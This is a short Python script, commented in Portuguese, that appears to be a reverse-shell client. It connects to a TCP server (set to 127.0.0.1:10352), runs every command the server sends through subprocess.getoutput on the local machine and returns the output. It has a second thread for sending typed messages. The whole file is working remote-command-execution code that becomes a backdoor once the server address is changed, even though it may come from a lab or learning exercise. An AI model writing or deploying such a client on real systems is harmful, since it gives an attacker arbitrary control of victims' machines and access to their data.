import socket
import threading
import os
import subprocess

SERVER_IP = '127.0.0.1'
SERVER_PORT = 10352

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((SERVER_IP, SERVER_PORT))

print("[*] Conectado ao servidor")

def execute_command(command):
    try:
        if command.lower() == "exit":
            return "Encerrando cliente."

        # Executa comando no sistema
        output = subprocess.getoutput(command)
        return output if output else "Comando executado."

    except Exception as e:
        return f"Erro: {str(e)}"

def receive_commands():
    while True:
        try:
            command = client.recv(4096).decode()

            if not command:
                break

            print(f"\n[COMANDO RECEBIDO]: {command}")

            result = execute_command(command)

            client.send(result.encode())

        except:
            break

def send_manual():
    # opcional: permite enviar algo manualmente
    while True:
        msg = input()
        if msg.lower() == "/quit":
            client.close()
            break
        client.send(msg.encode())

threading.Thread(target=receive_commands).start()
threading.Thread(target=send_manual).start()
